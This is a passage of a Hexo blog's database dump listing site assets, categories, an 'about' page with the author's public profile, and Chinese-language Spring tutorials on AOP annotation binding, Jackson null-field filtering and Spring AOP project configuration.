3/index.html","modified":1459931755933,"shasum":"134c610f2f25318cc1aa2363b8a242a8822b2636"},{"_id":"public/article/linux/借助fiddler抓包/index.html","modified":1459931755934,"shasum":"849cc2721dac704ad3db947179a7a918dec73fec"},{"_id":"public/tags/linux/index.html","modified":1459409773178,"shasum":"1a99a4811ffaf50870f2e33dc7713827bd4a6d9a"},{"_id":"public/tags/五笔/index.html","modified":1459414018859,"shasum":"0aadf601700088d5fec6345087115144cf453b88"},{"_id":"public/tags/装机/index.html","modified":1459414018859,"shasum":"d2f7088ec7e024cc04b565131acb5d85d4329896"},{"_id":"public/categories/系统配置/index.html","modified":1459414018859,"shasum":"9587c1ec637a1551e812b7ae5e1b7daa04a478ec"},{"_id":"public/categories/后端开发/index.html","modified":1459418740653,"shasum":"7f599e5f87df729392ab597f73fbefd2712679f8"},{"_id":"public/tags/java/index.html","modified":1459418740653,"shasum":"d35651ca2b12ea8599df96a66eb89580969699f0"},{"_id":"public/categories/后端开发/page/2/index.html","modified":1459414018859,"shasum":"763f68c9d9c8ea2ed137e627c7288e2e50772913"},{"_id":"public/tags/java/page/2/index.html","modified":1459414018859,"shasum":"250f53ebe2eceb5e5e44045c04e3a5900c8c9066"},{"_id":"public/tags/后端开发/index.html","modified":1459410178527,"shasum":"a634513b9e6bdc59c299931b89a17cc0527a266a"},{"_id":"source/_posts/article/java/velocity宏文件macro.vm缺失.md","shasum":"04e254ece8c2e687abef06a9d9e6134fc9184eb3","modified":1459438244000},{"_id":"public/article/java/velocity宏文件macro.vm缺失/index.html","modified":1459931755934,"shasum":"d4ae2825c02769a4c4e0920f1c5967a3a1ace15c"},{"_id":"public/categories/脚本/index.html","modified":1459929413851,"shasum":"17a851182804554cc59258fcf2e32de9a193de64"},{"_id":"public/categories/前端设计/index.html","modified":1459414018859,"shasum":"90fd2d56efffbb68720a57af86c806d9177c34cf"},{"_id":"public/archives/page/6/index.html","modified":1459414018859,"shasum":"7ccd3ef0bbf2b39bc12f4cdd922d25cd3b1d260f"},{"_id":"public/article/shell/文件遍历选取脚本/index.html","modified":1459931755933,"shasum":"84f80923230a3fbb93be7833261a4cf46ae3b64f"},{"_id":"public/page/6/index.html","modified":1459931755934,"shasum":"aa66be7567f2c93ea980b52d16aa8f5f6dfc703f"},{"_id":"public/zh-CN.json","modified":1459414668974,"shasum":"53c52d97dd4c54ac7d92de69f5518b3c76586562"},{"_id":"public/asserts/images/AngularJS-large.png","modified":1459420476138,"shasum":"01f44dca9fe36e6d96b5d0eb02a904bad851af01"},{"_id":"public/asserts/fiddler proxy settings.png","modified":1459420476138,"shasum":"7008573edd077718f9990efe18166f9a694b35a0"},{"_id":"public/asserts/ubuntu使用fiddler代理.png","modified":1459420476138,"shasum":"db76a37ef8b4adccdddf84163c20ae9dbd1e4b3e"},{"_id":"public/asserts/images/java-logo.jpg","modified":1459429888003,"shasum":"aeb040dca1bac7caa28037a7779c76ce87e17538"},{"_id":"public/asserts/images/java.png","modified":1459430684992,"shasum":"8a72414284e66fa08f89c2735e48f5bf79d94469"},{"_id":"public/asserts/images/java.jpg","modified":1459430522813,"shasum":"297a673c7f898cc72f582a72b08bfb1eaecfe981"},{"_id":"public/asserts/images/angularjs.png","modified":1459430151094,"shasum":"01f44dca9fe36e6d96b5d0eb02a904bad851af01"},{"_id":"public/asserts/images/java-file.png","modified":1459430424525,"shasum":"2352de30ae0e6540b42e29a9986172b93f25ba48"},{"_id":"public/asserts/images/openjdk.png","modified":1459431115994,"shasum":"7c3ef2b8f29b3ceedbec98c98cba603321a7c54a"},{"_id":"public/asserts/images/openjdk.jpg","modified":1459431202818,"shasum":"aef50a401ee779bd83730e6062613d1793bf6501"},{"_id":"public/asserts/images/openjdk2.png","modified":1459431329818,"shasum":"7c3ef2b8f29b3ceedbec98c98cba603321a7c54a"},{"_id":"public/asserts/images/javaee.png","modified":1459432015735,"shasum":"78c2869d9ba7fa9a1bd1f2521357f87ec6ba3ccf"},{"_id":"public/asserts/images/maven.png","modified":1459432801553,"shasum":"5c53129261aaa2520bc423ab2a683bc2e9575113"},{"_id":"public/asserts/images/spring.png","modified":1459435595558,"shasum":"d923fe18c56a27283c413bbf895288bc8bcfecda"},{"_id":"public/asserts/images/spring-by-pivotal.png","modified":1459435557047,"shasum":"d923fe18c56a27283c413bbf895288bc8bcfecda"},{"_id":"public/asserts/images/spring-back.png","modified":1459435589597,"shasum":"0b6faf9fe3301b190c6adf71ea8e630f82b43c7d"},{"_id":"public/asserts/images/spring-backup.png","modified":1459435655935,"shasum":"0b6faf9fe3301b190c6adf71ea8e630f82b43c7d"},{"_id":"public/asserts/images/spring-2.png","modified":1459435667765,"shasum":"0b6faf9fe3301b190c6adf71ea8e630f82b43c7d"},{"_id":"public/asserts/images/spring2.png","modified":1459435671921,"shasum":"0b6faf9fe3301b190c6adf71ea8e630f82b43c7d"},{"_id":"public/asserts/images/velocity.png","modified":1459435873753,"shasum":"6aaf8662b60459edac41f4a21cbed2e8614df006"},{"_id":"public/asserts/images/tomcat.png","modified":1459436071041,"shasum":"8c4a546b0515763f98f3a8348c95175f0e776c20"},{"_id":"public/asserts/images/velocity.gif","modified":1459436179766,"shasum":"95133ccfe2f1aa1860686619ead7d57a42b10706"},{"_id":"source/asserts/images/article/fiddler proxy settings.png","shasum":"7008573edd077718f9990efe18166f9a694b35a0","modified":1451368704000},{"_id":"source/asserts/images/article/ubuntu使用fiddler代理.png","shasum":"db76a37ef8b4adccdddf84163c20ae9dbd1e4b3e","modified":1451368704000},{"_id":"source/asserts/images/logo/jenkins.png","shasum":"a24b00070e6c96499e8d6820580f704b993a74a7","modified":1459436605000},{"_id":"public/asserts/images/article/fiddler proxy settings.png","modified":1459436741855,"shasum":"7008573edd077718f9990efe18166f9a694b35a0"},{"_id":"public/asserts/images/logo/jenkins.png","modified":1459436741860,"shasum":"a24b00070e6c96499e8d6820580f704b993a74a7"},{"_id":"public/asserts/images/hexo.png","modified":1459436741865,"shasum":"db98ac067990dffa39fdf4d4f0bf5e66ec56cb3d"},{"_id":"public/asserts/images/article/ubuntu使用fiddler代理.png","modified":1459436741866,"shasum":"db76a37ef8b4adccdddf84163c20ae9dbd1e4b3e"},{"_id":"source/asserts/images/logo/hexo.png","shasum":"1b17eb3dcb312e91a010400c2a27d8b665e84a41","modified":1459930823000},{"_id":"public/asserts/images/logo/hexo.png","modified":1459931248261,"shasum":"1b17eb3dcb312e91a010400c2a27d8b665e84a41"},{"_id":"source/asserts/images/logo/tomcat.png","shasum":"8c4a546b0515763f98f3a8348c95175f0e776c20","modified":1459435896000},{"_id":"public/asserts/images/logo/tomcat.png","modified":1459436838271,"shasum":"8c4a546b0515763f98f3a8348c95175f0e776c20"},{"_id":"source/asserts/images/logo/velocity.png","shasum":"6c3cdcaf3e0689325348b89a2406c60fcff58737","modified":1459438149000},{"_id":"public/asserts/images/logo/velocity.png","modified":1459438261433,"shasum":"6c3cdcaf3e0689325348b89a2406c60fcff58737"},{"_id":"source/asserts/images/logo/angularjs.png","shasum":"01f44dca9fe36e6d96b5d0eb02a904bad851af01","modified":1459419656000},{"_id":"source/asserts/images/logo/java-file.png","shasum":"2352de30ae0e6540b42e29a9986172b93f25ba48","modified":1459430068000},{"_id":"source/asserts/images/logo/spring2.png","shasum":"0b6faf9fe3301b190c6adf71ea8e630f82b43c7d","modified":1459435315000},{"_id":"source/asserts/images/logo/java.jpg","shasum":"297a673c7f898cc72f582a72b08bfb1eaecfe981","modified":1459430512000},{"_id":"source/asserts/images/logo/java.png","shasum":"8a72414284e66fa08f89c2735e48f5bf79d94469","modified":1459430782000},{"_id":"public/asserts/images/logo/spring2.png","modified":1459436902821,"shasum":"0b6faf9fe3301b190c6adf71ea8e630f82b43c7d"},{"_id":"public/asserts/images/logo/java-file.png","modified":1459436902821,"shasum":"2352de30ae0e6540b42e29a9986172b93f25ba48"},{"_id":"public/asserts/images/logo/angularjs.png","modified":1459436902821,"shasum":"01f44dca9fe36e6d96b5d0eb02a904bad851af01"},{"_id":"public/asserts/images/logo/java.png","modified":1459436902823,"shasum":"8a72414284e66fa08f89c2735e48f5bf79d94469"},{"_id":"public/asserts/images/logo/java.jpg","modified":1459436902824,"shasum":"297a673c7f898cc72f582a72b08bfb1eaecfe981"},{"_id":"source/asserts/images/logo/maven.png","shasum":"5c53129261aaa2520bc423ab2a683bc2e9575113","modified":1459432128000},{"_id":"source/asserts/images/logo/javaee.png","shasum":"78c2869d9ba7fa9a1bd1f2521357f87ec6ba3ccf","modified":1459431872000},{"_id":"source/asserts/images/logo/spring.png","shasum":"d923fe18c56a27283c413bbf895288bc8bcfecda","modified":1459435488000},{"_id":"source/asserts/images/logo/openjdk.png","shasum":"7c3ef2b8f29b3ceedbec98c98cba603321a7c54a","modified":1459430945000},{"_id":"public/asserts/images/logo/openjdk.png","modified":1459436905950,"shasum":"7c3ef2b8f29b3ceedbec98c98cba603321a7c54a"},{"_id":"public/asserts/images/logo/spring.png","modified":1459436905950,"shasum":"d923fe18c56a27283c413bbf895288bc8bcfecda"},{"_id":"public/asserts/images/logo/javaee.png","modified":1459436905950,"shasum":"78c2869d9ba7fa9a1bd1f2521357f87ec6ba3ccf"},{"_id":"public/asserts/images/logo/maven.png","modified":1459436905950,"shasum":"5c53129261aaa2520bc423ab2a683bc2e9575113"},{"_id":"source/asserts/images/logo/git.png","shasum":"094d0cfb056b275e6948f010d8803ed2a94f3648","modified":1459437170000},{"_id":"public/asserts/images/logo/git.png","modified":1459437246159,"shasum":"094d0cfb056b275e6948f010d8803ed2a94f3648"},{"_id":"source/asserts/images/logo/ubuntu.png","shasum":"e05e6e58c559bbb805e95d3883e1528fb4a6c234","modified":1459437516000},{"_id":"public/asserts/images/logo/ubuntu.png","modified":1459437527349,"shasum":"e05e6e58c559bbb805e95d3883e1528fb4a6c234"},{"_id":"public/asserts/images/logo/mac.jpg","modified":1459437531434,"shasum":"4c9c42b778414cfd63848f923d61cabd2734f4ef"},{"_id":"public/asserts/images/logo/ubuntu3.svg","modified":1459437621855,"shasum":"62c0842ef1bf17828dddd2ef4a2e0fe1350df914"},{"_id":"source/asserts/images/logo/ubuntu2.png","shasum":"fb55e693049903c1963656fdbdc7e32f578015df","modified":1459437621000},{"_id":"public/asserts/images/logo/ubuntu2.png","modified":1459437640727,"shasum":"fb55e693049903c1963656fdbdc7e32f578015df"},{"_id":"public/asserts/images/logo/ubuntu4.png","modified":1459437640727,"shasum":"8dd99b80526d1f9e597b02347da50cf47a5c9d38"},{"_id":"source/asserts/images/logo/velocity.jpg","shasum":"40929313840e90873f07886c07a7f1b1536b8076","modified":1459438186000},{"_id":"public/asserts/images/logo/velocity.jpg","modified":1459438261439,"shasum":"40929313840e90873f07886c07a7f1b1536b8076"},{"_id":"source/asserts/images/logo/bash.png","shasum":"cb5dd647cdb12a9b32b15f3532b0a00c7adeb12b","modified":1459929197000},{"_id":"source/asserts/images/logo/bash2.png","shasum":"76ab35d7a3a6556678e26d8aeee2557e6174dd97","modified":1459929250000},{"_id":"source/asserts/images/logo/bash3.png","shasum":"a675296ae4d6550cd8abd2070204eabce756fc80","modified":1459929229000},{"_id":"public/asserts/images/logo/bash.png","modified":1459929410735,"shasum":"cb5dd647cdb12a9b32b15f3532b0a00c7adeb12b"},{"_id":"public/asserts/images/logo/bash3.png","modified":1459929410739,"shasum":"a675296ae4d6550cd8abd2070204eabce756fc80"},{"_id":"public/asserts/images/logo/bash2.png","modified":1459929410742,"shasum":"76ab35d7a3a6556678e26d8aeee2557e6174dd97"},{"_id":"source/asserts/images/logo/blog.png","shasum":"2b842ef20c2292f6c8b341e3daf975035441498f","modified":1459930077000},{"_id":"source/asserts/images/logo/blog8.jpg","shasum":"51144b1feb461854eb639935f3b66fbab7eed34f","modified":1459930132000},{"_id":"source/asserts/images/logo/ejs.png","shasum":"617c87ac993d14331fd79e59706057a2d695828e","modified":1459931176000},{"_id":"source/asserts/images/logo/hexo2.png","shasum":"db98ac067990dffa39fdf4d4f0bf5e66ec56cb3d","modified":1459436364000},{"_id":"source/asserts/images/logo/hexo3.png","shasum":"9b17fd97e5629f09f92cfa032d9c482b0c834234","modified":1459929907000},{"_id":"source/asserts/images/logo/mysql.png","shasum":"fa740f493cb12f79aca03d10ff1afb4e1e364844","modified":1459931604000},{"_id":"source/asserts/images/logo/nodejs.png","shasum":"341559bb04abced53ec48c0b76001fea8c5af5c2","modified":1459931141000},{"_id":"source/asserts/images/logo/ubuntu3.png","shasum":"8dd99b80526d1f9e597b02347da50cf47a5c9d38","modified":1459437633000},{"_id":"source/asserts/images/logo/blog3.jpg","shasum":"e53daaa5e7c8bd3453a7bf9f517f56a4295bf955","modified":1459930055000},{"_id":"source/asserts/images/logo/blog4.jpg","shasum":"cfa16a721efe73c6111f92ddadd2180926d01309","modified":1459930063000},{"_id":"source/asserts/images/logo/blog6.png","shasum":"848a0a5a9fa5551d5ad33f7a8960e5b2a891da2c","modified":1459930110000},{"_id":"source/asserts/images/logo/blog5.jpg","shasum":"a483db48e252c4fed599f8cfc0773f0990b4c822","modified":1459930086000},{"_id":"source/asserts/images/logo/blog9.jpg","shasum":"e4cd2c202681578c9f903b1921fefb7fffaf9fca","modified":1459930141000},{"_id":"source/asserts/images/logo/blog2.jpg","shasum":"90085a11561ece9a0e9699dcdeeb11ac4c6bb3d1","modified":1459930027000},{"_id":"source/asserts/images/logo/blog7.jpg","shasum":"de70e96b00b9f4e46a9c68ed23ec5e2916449d31","modified":1459930122000},{"_id":"public/asserts/images/logo/blog.png","modified":1459931248268,"shasum":"2b842ef20c2292f6c8b341e3daf975035441498f"},{"_id":"public/asserts/images/logo/ubuntu3.png","modified":1459931248270,"shasum":"8dd99b80526d1f9e597b02347da50cf47a5c9d38"},{"_id":"public/asserts/images/logo/nodejs.png","modified":1459931248271,"shasum":"341559bb04abced53ec48c0b76001fea8c5af5c2"},{"_id":"public/asserts/images/logo/mysql.png","modified":1459931619485,"shasum":"fa740f493cb12f79aca03d10ff1afb4e1e364844"},{"_id":"public/asserts/images/logo/mysql.jpg","modified":1459931248274,"shasum":"302c31f8dde2a7b20ee56360394dba02b45b91e9"},{"_id":"public/asserts/images/logo/hexo3.png","modified":1459931248275,"shasum":"9b17fd97e5629f09f92cfa032d9c482b0c834234"},{"_id":"public/asserts/images/logo/hexo2.png","modified":1459931248277,"shasum":"db98ac067990dffa39fdf4d4f0bf5e66ec56cb3d"},{"_id":"public/asserts/images/logo/ejs.png","modified":1459931248278,"shasum":"617c87ac993d14331fd79e59706057a2d695828e"},{"_id":"public/asserts/images/logo/blog9.jpg","modified":1459931248281,"shasum":"e4cd2c202681578c9f903b1921fefb7fffaf9fca"},{"_id":"public/asserts/images/logo/blog8.jpg","modified":1459931248284,"shasum":"51144b1feb461854eb639935f3b66fbab7eed34f"},{"_id":"public/asserts/images/logo/blog7.jpg","modified":1459931248291,"shasum":"de70e96b00b9f4e46a9c68ed23ec5e2916449d31"},{"_id":"public/asserts/images/logo/blog6.png","modified":1459931248295,"shasum":"848a0a5a9fa5551d5ad33f7a8960e5b2a891da2c"},{"_id":"public/asserts/images/logo/blog5.jpg","modified":1459931248297,"shasum":"a483db48e252c4fed599f8cfc0773f0990b4c822"},{"_id":"public/asserts/images/logo/blog4.jpg","modified":1459931248300,"shasum":"cfa16a721efe73c6111f92ddadd2180926d01309"},{"_id":"public/asserts/images/logo/blog3.jpg","modified":1459931248302,"shasum":"e53daaa5e7c8bd3453a7bf9f517f56a4295bf955"},{"_id":"public/asserts/images/logo/blog2.jpg","modified":1459931248311,"shasum":"90085a11561ece9a0e9699dcdeeb11ac4c6bb3d1"},{"_id":"source/asserts/images/logo/mac.png","shasum":"0c5e034695e1d6abfa8fa39832014031b9a9b86a","modified":1459931337000},{"_id":"public/asserts/images/logo/mac.png","modified":1459931350791,"shasum":"0c5e034695e1d6abfa8fa39832014031b9a9b86a"}],"Category":[{"name":"java","_id":"cilpxkg920004avbtr4pk2bwc"},{"name":"tool","_id":"cilpxkg970009avbtc5ispztq"},{"name":"shell","_id":"cilpxkg9z001kavbtvlmnnccd"},{"name":"信息安全","_id":"cilpxkga9001zavbtb5t6zfah"},{"name":"mac","_id":"cilpxkgad0028avbt6luuuhqg"},{"name":"linux","_id":"cilpxkgai002lavbth1jgip2c"},{"name":"前端技术","_id":"cilpxkgax0038avbt2jip4tj0"},{"name":"持续集成","_id":"cilpxkgaz003davbtrkbl2cqg"},{"name":"开发工具","_id":"cilpxkgbp004davbtgqbdcmoq"},{"name":"博客","_id":"cilpxkgbr004iavbt7jvnhfkw"},{"name":"版本控制","_id":"cilpxkgc50059avbtjw6bfq95"},{"name":"数据库","_id":"cilpxkgck005savbt7f1qcd9t"},{"name":"cache","_id":"cilpxkgcn005zavbts4obb4rh"},{"name":"mysql","_id":"cilpxkgcv0065avbtp9bhn5an"},{"name":"数据存储","_id":"cimfy8niq0000tjbtqi4qzub8"},{"name":"博客搭建","_id":"cimfya2bi0006tjbtmgvk8nm4"},{"name":"工具软件","_id":"cimfygoh0000qtjbtu245fkqc"},{"name":"系统配置","_id":"cimfyvn6r001ttjbtlpkxbg3y"},{"name":"后端开发","_id":"cimfz2bmp0026tjbtxumij3vj"},{"name":"脚本","_id":"cimfz6kc40037tjbtsto9ydzw"},{"name":"前端设计","_id":"cimfz9ngs003etjbt5hemhbrc"}],"Data":[],"Page":[{"_content":"<script type=\"text/javascript\" src=\"http://www.qq.com/404/search_children.js\" charset=\"utf-8\" homePageUrl=\"http://yeshaoting.cn\" homePageName=\"回到我的主页\"></script>\n","source":"404.html","raw":"<script type=\"text/javascript\" src=\"http://www.qq.com/404/search_children.js\" charset=\"utf-8\" homePageUrl=\"http://yeshaoting.cn\" homePageName=\"回到我的主页\"></script>\n","date":"2016-02-24T08:38:49.000Z","updated":"2016-02-24T08:38:49.000Z","path":"404.html","title":"","comments":1,"layout":"page","_id":"cilpxkg890000avbtyigzgal0"},{"_content":"google-site-verification: googlede92bb3790f9a30d.html","source":"googlede92bb3790f9a30d.html","raw":"google-site-verification: googlede92bb3790f9a30d.html","date":"2016-03-01T05:14:42.000Z","updated":"2016-03-01T05:14:38.000Z","path":"googlede92bb3790f9a30d.html","title":"","comments":1,"layout":"page","_id":"cilpxkg8s0001avbtr4meq5lq"},{"date":"2015-12-29T07:51:00.000Z","title":"关于","_content":"\nhi，我是叶绍亭，80后，将近而立之年，目前是在美团工作的Web开发者一枚。\n计算机专业毕业，3年在职工作经验，5年web开发经验。\n\n本人酷爱计算机，执着于编程，崇尚技术，立志成为技术大牛。\n\n\n## 联系我\n - 邮箱：[yeshaoting@163.com](mailto:yeshaoting@163.com)\n - 主页：http://yeshaoting.cn\n - 技术博客：http://jarg.iteye.com\n - 微博：[@悠然萧萧](http://weibo.com/jarg)\n\n\n## 教育经历\n| 学校 | 学历 | 专业 | 起至时间 |\n|---|---|\n| 大连海事大学 | 研究生| 计算机科学与技术 | 2010-09-01 ~ 2012-07-01 |\n| 黑龙江大学 | 本科| 计算机科学与技术 | 2006-09-01 ~ 2010-07-01 |\n\n\n## 工作经历\n| 公司 | 职位 | 起至时间 |\n|---|---|\n| 美团 | Java工程师 | 2015-11-25 ~ 至今 |\n| 搜狐视频 | Java工程师 | 2014-12-17 ~ 2015-11-23 |\n| 百度 | Java工程师 | 2006-07-11 ~ 2014-12-15 |\n\n\n## 关注技术\n**后端**：`java`、`spring`、`mybatis`、`hibernate`、`quartz`\n**前端**：`jquery`、`bootstrap`、`angularjs`\n**系统**：`linux`、`shell`、`vim`\n**测试**：`jmeter`、`selenium`\n**搜索**：`solr`、`lucene`\n**数据库**：`mysql`\n**持续集成**：`jenkins`\n\n\n## 个人箴言\n我不是最棒的，但注定我是最有希望的。\n\n\n## 关于博客\n借助hexo搭建的博客，静态页面代码托管在github上。\n\n\n## 声明\n博客所有观点纯属个人理解，如有误导请指正。\n\n","source":"about/index.md","raw":"\ndate: 2015-12-29 15:51:00\ntitle: 关于\n---\n\nhi，我是叶绍亭，80后，将近而立之年，目前是在美团工作的Web开发者一枚。\n计算机专业毕业，3年在职工作经验，5年web开发经验。\n\n本人酷爱计算机，执着于编程，崇尚技术，立志成为技术大牛。\n\n\n## 联系我\n - 邮箱：[yeshaoting@163.com](mailto:yeshaoting@163.com)\n - 主页：http://yeshaoting.cn\n - 技术博客：http://jarg.iteye.com\n - 微博：[@悠然萧萧](http://weibo.com/jarg)\n\n\n## 教育经历\n| 学校 | 学历 | 专业 | 起至时间 |\n|---|---|\n| 大连海事大学 | 研究生| 计算机科学与技术 | 2010-09-01 ~ 2012-07-01 |\n| 黑龙江大学 | 本科| 计算机科学与技术 | 2006-09-01 ~ 2010-07-01 |\n\n\n## 工作经历\n| 公司 | 职位 | 起至时间 |\n|---|---|\n| 美团 | Java工程师 | 2015-11-25 ~ 至今 |\n| 搜狐视频 | Java工程师 | 2014-12-17 ~ 2015-11-23 |\n| 百度 | Java工程师 | 2006-07-11 ~ 2014-12-15 |\n\n\n## 关注技术\n**后端**：`java`、`spring`、`mybatis`、`hibernate`、`quartz`\n**前端**：`jquery`、`bootstrap`、`angularjs`\n**系统**：`linux`、`shell`、`vim`\n**测试**：`jmeter`、`selenium`\n**搜索**：`solr`、`lucene`\n**数据库**：`mysql`\n**持续集成**：`jenkins`\n\n\n## 个人箴言\n我不是最棒的，但注定我是最有希望的。\n\n\n## 关于博客\n借助hexo搭建的博客，静态页面代码托管在github上。\n\n\n## 声明\n博客所有观点纯属个人理解，如有误导请指正。\n\n","updated":"2016-02-24T08:49:14.000Z","path":"about/index.html","comments":1,"layout":"page","_id":"cilpxkg8v0002avbtkubqne9f"}],"Post":[{"title":"注解切面缺少注解参数","date":"2016-02-28T05:54:00.000Z","_content":"\n<img src=\"/asserts/images/logo/spring.png\" class=\"img-logo img-center\" />\n\n针对注解Retry进行切面处理，报**error at --0 formal unbound in pointcut**异常。\n\n因为传递给aroundAdvice切面方法缺少注解参数。\n例如：\n``` java\n  @Around(value = \"point()\")\n  public void aroundAdvice(ProceedingJoinPoint joinPoint, Retry retry) throws Throwable\n```\n\n**正确样例**：\n``` java\n  @Around(value = \"point() && @annotation(retry)\")\n  public void aroundAdvice(ProceedingJoinPoint joinPoint, Retry retry) throws Throwable\n```","source":"_posts/article/spring/注解切面缺少注解参数.md","raw":"title: 注解切面缺少注解参数\ntags:\n  - aop\n  - spring\n  - issue\n  - java\ncategories:\n  - 后端开发\ndate: 2016-02-28 13:54:00\n---\n\n<img src=\"/asserts/images/logo/spring.png\" class=\"img-logo img-center\" />\n\n针对注解Retry进行切面处理，报**error at --0 formal unbound in pointcut**异常。\n\n因为传递给aroundAdvice切面方法缺少注解参数。\n例如：\n``` java\n  @Around(value = \"point()\")\n  public void aroundAdvice(ProceedingJoinPoint joinPoint, Retry retry) throws Throwable\n```\n\n**正确样例**：\n``` java\n  @Around(value = \"point() && @annotation(retry)\")\n  public void aroundAdvice(ProceedingJoinPoint joinPoint, Retry retry) throws Throwable\n```","slug":"article/spring/注解切面缺少注解参数","published":1,"updated":"2016-03-31T15:24:32.000Z","_id":"cilpxkg9a000javbt10t86odn","comments":1,"layout":"post","photos":[],"link":""},{"title":"\bspring过滤\b\b值为null的JSON\b\b字段","date":"2016-02-28T08:57:00.000Z","_content":"\n<img src=\"/asserts/images/logo/spring.png\" class=\"img-logo img-center\" />\n\n\n## 问题说明\n使用@ResponseBody注解的spring接口返回的JSON格式结果有时会返回包含值为null的字段，但是与前端联调可能并不希望包含这样的字段。\n因此，需要过滤掉这类字段。\n\n\n## 解决方案\nspring json序列化时，通过`com.fasterxml.jackson.annotation.JsonInclude.Include`指定是否返回值为null的字段。\n\n如下配置所示：\n``` xml\n<mvc:annotation-driven>\n    <mvc:message-converters register-defaults=\"true\">\n        <bean class=\"org.springframework.http.converter.json.MappingJackson2HttpMessageConverter\">\n            <property name=\"objectMapper\">\n                <bean class=\"com.fasterxml.jackson.databind.ObjectMapper\">\n                    <property name=\"serializationInclusion\">\n                        <value type=\"com.fasterxml.jackson.annotation.JsonInclude.Include\">NON_NULL</value>\n                    </property>\n                </bean>\n            </property>\n        </bean>\n    </mvc:message-converters>\n</mvc:annotation-driven>\n```\n\n## 参考文档\nhttp://segmentfault.com/q/1010000002522525","source":"_posts/article/spring/spring过滤值为null的JSON字段.md","raw":"title: \"\\bspring过滤\\b\\b值为null的JSON\\b\\b字段\"\ntags:\n  - issue\n  - java\n  - spring\ncategories:\n  - 后端开发\ndate: 2016-02-28 16:57:00\n---\n\n<img src=\"/asserts/images/logo/spring.png\" class=\"img-logo img-center\" />\n\n\n## 问题说明\n使用@ResponseBody注解的spring接口返回的JSON格式结果有时会返回包含值为null的字段，但是与前端联调可能并不希望包含这样的字段。\n因此，需要过滤掉这类字段。\n\n\n## 解决方案\nspring json序列化时，通过`com.fasterxml.jackson.annotation.JsonInclude.Include`指定是否返回值为null的字段。\n\n如下配置所示：\n``` xml\n<mvc:annotation-driven>\n    <mvc:message-converters register-defaults=\"true\">\n        <bean class=\"org.springframework.http.converter.json.MappingJackson2HttpMessageConverter\">\n            <property name=\"objectMapper\">\n                <bean class=\"com.fasterxml.jackson.databind.ObjectMapper\">\n                    <property name=\"serializationInclusion\">\n                        <value type=\"com.fasterxml.jackson.annotation.JsonInclude.Include\">NON_NULL</value>\n                    </property>\n                </bean>\n            </property>\n        </bean>\n    </mvc:message-converters>\n</mvc:annotation-driven>\n```\n\n## 参考文档\nhttp://segmentfault.com/q/1010000002522525","slug":"article/spring/spring过滤值为null的JSON字段","published":1,"updated":"2016-03-31T15:24:50.000Z","_id":"cilpxkg9e000ravbtvqqasmcm","comments":1,"layout":"post","photos":[],"link":""},{"title":"spring特性实践 - AOP","date":"2015-12-29T05:58:00.000Z","_content":"\n<img src=\"/asserts/images/logo/spring.png\" class=\"img-logo img-center\" />\n\n\n此段内容说明如何使用spring aop，并通过一个函数耗时统计切面demo来讲述使用具体步骤。\n\n\n## 一、创建maven工程\n\n通过STS创建一个maven工程martinye-demo-spring-support。\n\n修改pom.xml文件，添加项目相关依赖如下：\n\n**servlet**\n- javax.servlet-api\n- jstl\n- standard\n- jsp-api\n\n**spring**\n- spring-webmvc\n- aspectjweaver\n\n**log**\n- slf4j-api\n- slf4j-log4j12\n\n**utils**\n- commons-lang3\n- commons-collections\n- commons-io\n- guava\n- fastjson\n\n**test**\n- junit\n- spring-test\n\n\n<!-- more -->\n\n## 二、配置servlet容器\n配置路径：/martinye-demo-spring-velocity/src/main/webapp/WEB-INF/web.xml\n\nweb servlet容器web.xml，添加加载spring容器的配置。\n根据关注点不同，我们把spring容器配置定义分开，如下所示：\n\n### 定义spring root容器\n实例化类对象。\n\n配置如下：\n``` xml\n  <!-- The definition of the Root Spring Container shared by all Servlets and Filters -->\n  <context-param>\n    <param-name>contextConfigLocation</param-name>\n    <param-value>classpath:spring-beans.xml</param-value>\n  </context-param>\n\n  <!-- Creates the Spring Container shared by all Servlets and Filters -->\n  <listener>\n    <listener-class>org.springframework.web.context.ContextLoaderListener</listener-class>\n  </listener>\n```\n\n### 定义spring mvc容器\n处理用户请求。\nspring mvc容器对应的ApplicationContext是spring root容器对应的ApplicationContext的子类对象，可持有spring root容器中注入的类对象。\n\n配置如下：\n``` xml\n  <!-- Processes application requests -->\n  <servlet>\n    <servlet-name>spring</servlet-name>\n    <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>\n    <init-param>\n      <param-name>contextConfigLocation</param-name>\n      <param-value>classpath:spring-mvc.xml</param-value>\n    </init-param>\n    <load-on-startup>1</load-on-startup>\n  </servlet>\n\n  <servlet-mapping>\n    <servlet-name>spring</servlet-name>\n    <url-pattern>/</url-pattern>\n  </servlet-mapping>\n```\n\n\n## 三、配置spring-beans.xml\n配置如下：\n``` xml\n  <context:property-placeholder ignore-resource-not-found=\"true\" location=\"classpath*:app.properties\" />\n\n  <!-- 使用annotation 自动注册bean, 并保证@Required、@Autowired的属性被注入 -->\n  <context:component-scan base-package=\"com.martinye.demo\" use-default-filters=\"true\">\n    <context:include-filter type=\"annotation\" expression=\"org.aspectj.lang.annotation.Aspect\"/>\n    <context:exclude-filter type=\"annotation\" expression=\"org.springframework.stereotype.Controller\" />\n    <context:exclude-filter type=\"annotation\" expression=\"org.springframework.web.bind.annotation.ControllerAdvice\" />\n  </context:component-scan>\n\n  <aop:aspectj-autoproxy expose-proxy=\"true\" proxy-target-class=\"false\"/>\n```\n\n**配置描述**：\n\n1. 加载配置资源：app.properties。\n\n2. 启用注解功能\n除Controller以外的Component注解注释的类，自动注入@Required, @Autowired, @PostConstruct, @PreDestroy, @Resource, @PersistenceContext and @PersistenceUnit注释的属性。\n\n3. 开启aop，启用@AspectJ注解。\n在注入当前容器的类对象方法上，支持AOP注解。\n\n\n## 四、配置spring-mvc.xml\n配置如下：\n``` xml\n  <context:property-placeholder ignore-resource-not-found=\"true\" location=\"classpath*:app.properties\" />\n\n  <!-- 使用annotation 自动注册bean, 并保证@Required、@Autowired的属性被注入 -->\n  <context:component-scan base-package=\"com.martinye.demo\" use-default-filters=\"false\">\n    <context:include-filter type=\"annotation\" expression=\"org.aspectj.lang.annotation.Aspect\"/>\n    <context:include-filter type=\"annotation\" expression=\"org.springframework.stereotype.Controller\" />\n    <context:include-filter type=\"annotation\" expression=\"org.springframework.web.bind.annotation.ControllerAdvice\" />\n  </context:component-scan>\n\n  <!-- Resolves views selected for rendering by @Controllers to .jsp resources in the /WEB-INF/views directory -->\n  <bean class=\"org.springframework.web.servlet.view.InternalResourceViewResolver\">\n    <property name=\"prefix\" value=\"/WEB-INF/views/\" />\n    <property name=\"suffix\" value=\".jsp\" />\n  </bean>\n\n  <aop:aspectj-autoproxy 